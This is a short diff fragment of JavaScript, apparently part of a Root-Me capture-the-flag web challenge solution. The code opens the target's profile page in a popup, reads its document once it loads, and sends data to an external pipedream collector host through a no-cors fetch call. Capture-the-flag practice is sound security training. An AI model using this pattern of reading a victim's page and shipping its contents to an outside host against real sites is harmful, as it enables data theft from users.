@@ -16,7 +16,7 @@ try{
 try{
 	var aaa = open('http://challenge01.root-me.org:58003/profile', '_blank', 'popup');
 
-	aaa.onpageshow = function() {
+	aaa.onload = function() {
     	
 		var bb = aaa.document
 		try{
@@ -49,7 +49,7 @@ try{
 		} catch (error) {
 	  		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr3='+error, {mode: 'no-cors'})
 		}
-    	
+
  	};
 	
 	
